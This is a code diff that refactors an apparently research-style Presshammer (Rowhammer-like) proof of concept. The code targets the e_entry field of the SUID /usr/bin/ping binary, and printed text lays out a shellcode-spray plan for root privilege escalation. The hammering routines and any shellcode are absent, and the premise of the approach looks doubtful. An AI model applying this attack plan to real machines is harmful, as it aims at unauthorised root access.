@@ -10,12 +10,10 @@ namespace color {
 }
 
 
-
 int openBinary(){
     int fd = open("/usr/bin/ping", O_RDONLY);
-
     if(fd == -1){
-        std::cerr << color::RED << "[!] " << color::RESET << "Error opening binary: /usr/bin/ping" << std::endl;
+        showErrorInfo("Error opening binary: /usr/bin/ping");
         perror("open");
         close(fd);
         exit(EXIT_FAILURE);
@@ -24,59 +22,92 @@ int openBinary(){
 }
 
 
-void showElfHeader(Elf64_Ehdr *header){
-    std::cout << "\n" << "------------------- " << color::RED << "/usr/bin/ping" << color::RESET << " -------------------" << "\n"
-    << color::BLUE << "[*] " << color::RESET << "ELF header memory address: " << (void*) header << "\n"
-    << color::BLUE << "[*] " << color::RESET << "Entry point: " << "0x" << header->e_entry << "\n"
-    << color::BLUE << "[*] " << color::RESET << "Entry point memory address: " << (void*) & (header->e_entry) << "\n"
-    << "------------------------------------------------" << "\n" << std::endl;
-}
 
 
 void checkElfHeader(bool isDoubleSided) {
-    std::cout << color::BLUE << "[*] " << color::RESET << "CHECK ELF HEADER (E_ENTRY)" << std::endl;
+    showInfo("CHECK ELF HEADER (E_ENTRY)");
+    
+    // ========================================================================
+    // STEP 1. Open binary with SUID bit active or sudo permissions
+    // ========================================================================
+    showStep(1, "Open binary with SUID bit active or sudo permissions");
 
-    // opens the binary with SUID bit active or sudo permissions 
     int fd = openBinary();
-
-
-    // gets binary size
     off_t size = lseek(fd, 0, SEEK_END);
     lseek(fd, 0, SEEK_SET);
 
+    showSuccessInfo("/usr/bin/ping binary opened");
 
-    // mapping binary file in memory
+
+    // ========================================================================
+    // STEP 2. Map the binary into memory (read-only, private)
+    // ========================================================================
+    showStep(2, "Map the binary into memory (read-only, private)");
+
     auto *mappedTarget = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
     if (mappedTarget == MAP_FAILED) {
-        std::cerr << color::RED << "[!] " << color::RESET << "mmap failed" << std::endl;
+        showErrorInfo("mmap failed");
         perror("mmap");
         close(fd);
         exit(EXIT_FAILURE);
     }
 
-    // access to ELF header 
+    volatile char *binaryTargetAddress = (volatile char*) mappedTarget;
+    uintptr_t binaryTarget = (uintptr_t) binaryTargetAddress;
+
+    showSuccessAddress("/usr/bin/ping mapped: ", binaryTarget);
+
+
+    // ========================================================================
+    // STEP 3. Access the ELF header (this gives access to the value of e_entry)
+    // ========================================================================
+    showStep(3, "Access the ELF header (this gives access to the value of e_entry)"); 
+    
     Elf64_Ehdr *header = (Elf64_Ehdr *) mappedTarget;
+    showElfHeaderInfo(header);
 
-
-    // show elf header data
-    showElfHeader(header);
-
-
-    // gets target address
     volatile char *targetAddress = (volatile char *) & (header->e_entry);
     uintptr_t target = (uintptr_t) targetAddress;
-    std::cout << color::GREEN << "[+] " << color::RESET << "Memory address target: " << std::hex << target << std::endl;
 
+
+
+    // ======================================================================================================
+    // STEP 4. Check if can apply presshammer (double or single sided) to try to modify the e_entry address
+    // ======================================================================================================
+    showStep(4, "Check if can apply presshammer to try to modify the e_entry address");
 
     if(isDoubleSided){
         doubleSidedPresshammer(target);
     }else{
         singleSidedPresshammer(target);
     }
-
+    showSuccessAddress("Hammered target address: ", target);
 
     munmap(mappedTarget, size);
     close(fd);
-    
-    //hacer : lo que apunte en el movil + tener el binario cargado en memoria / ser rapido para ejecutar el binario con la nueva dirección --> tener el programa corriendo pimpimpim hay cambio, ejecutas
+
+
+    // ========================================================================
+    // CONCLUSION
+    // ========================================================================
+    showConclusion();
+    std::cout << "The goal is to modify the value of `e_entry` in memory. \n"
+    << "- `e_entry` is the entry point of the program, i.e., the address where the OS starts executing the binary. \n"
+    << "- If we manage to modify this address, we can redirect the execution of the binary to a location in memory controlled by the attacker (e.g., where malicious shellcode resides). \n"
+    << "In this case, we use the **Presshammer** technique, a hardware attack that induces bit errors in memory cells by repeatedly accessing neighboring memory addresses. \n"
+    << "This will allow us to try and modify the `e_entry` address. \n" << std::endl;
+
+    std::cout << "**Spray of shellcode:** \n" 
+    << "A \"spray\" of memory must be created around the address we altered, filling that area with malicious shellcode. \n"
+    << "The shellcode should be designed to execute arbitrary commands (e.g., spawning a shell). \n"
+    << "If the modification of `e_entry` is successful, the OS may execute the shellcode instead of the original binary code. \n" << std::endl;
+ 
+    std::cout << "**Impact of a successful attack:** \n" 
+    << "If the attack is successful, the binary that originally had normal user permissions (e.g., executed by a non-privileged user) \n"
+    << "will now execute with **root** privileges because the SUID bit in the **ping** binary grants those privileges to the process. \n"
+    << "If `e_entry` points to malicious shellcode, the attacker could execute commands with root privileges, resulting in a **privilege escalation**. \n" << std::endl;
+
+    std::cout << "**Limitations of the attack:** \n"
+    << "This attack only affects the process's memory. The modifications in memory are volatile and only exist while the process is running." << std::endl;
+
 }
